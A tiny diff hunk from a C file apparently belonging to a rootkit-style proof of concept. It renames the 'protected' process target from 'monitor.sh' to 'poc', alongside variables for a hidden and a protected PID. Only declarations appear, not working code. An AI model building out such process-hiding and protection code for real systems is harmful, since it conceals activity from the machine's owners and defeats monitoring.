@@ -17,7 +17,7 @@
 
 
 #define FLAG 0x80000000
-const char *protected = "monitor.sh";
+const char *protected = "poc";
 const char *hide = "monitor.sh";
 int hidden_pid=-1;
 int protected_pid=-1;
